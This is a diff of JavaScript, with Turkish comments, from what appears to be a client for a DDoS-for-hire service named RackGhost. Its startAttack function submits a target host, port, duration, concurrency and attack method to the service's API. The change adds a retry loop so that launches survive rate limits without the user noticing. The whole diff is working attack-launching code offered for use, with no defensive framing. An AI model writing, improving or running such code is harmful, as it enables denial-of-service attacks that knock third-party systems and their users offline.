@@ -133,24 +133,35 @@ async function startAttack(params) {
     throw new Error(`RackGhost: en fazla ${LIMITS.maxConcurrents} concurrent girebilirsiniz.`);
   }
   const sendConc = Math.max(1, Math.floor(wanted / mult));
-  let data;
-  try {
-    data = await apiCall({
-      action: 'start',
-      api: 2,
-      params: {
-        host: params.host,
-        port: parseInt(params.port),
-        time: parseInt(params.time),
-        concurrents: sendConc,
-        method
-      }
-    });
-  } catch (err) {
-    throw new Error(normalizeRgError(err.message));
+  // Rate limit gecici bir durumdur; turu tamamen kaybetmek yerine birkac
+  // saniye icinde yeniden dene (kullanici bunu hissetmemeli).
+  let data = null;
+  let lastErr = null;
+  for (let attempt = 1; attempt <= 4; attempt += 1) {
+    try {
+      data = await apiCall({
+        action: 'start',
+        api: 2,
+        params: {
+          host: params.host,
+          port: parseInt(params.port),
+          time: parseInt(params.time),
+          concurrents: sendConc,
+          method
+        }
+      });
+      if (data && data.success) break;
+      lastErr = new Error(normalizeRgError(data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
+      data = null;
+    } catch (err) {
+      lastErr = new Error(normalizeRgError(err.message));
+    }
+    const isRateLimit = /hız sınırı|wait 1 second|rate/i.test(lastErr.message);
+    if (!isRateLimit || attempt === 4) break;
+    await new Promise((r) => setTimeout(r, 2500 * attempt));
   }
   if (!data || !data.success) {
-    throw new Error(normalizeRgError(data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
+    throw lastErr || new Error('RackGhost saldiri baslatamadi');
   }
   const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
   // RackGhost her saldiriyi tek kayit + 'slots' alaniyla dondurur;
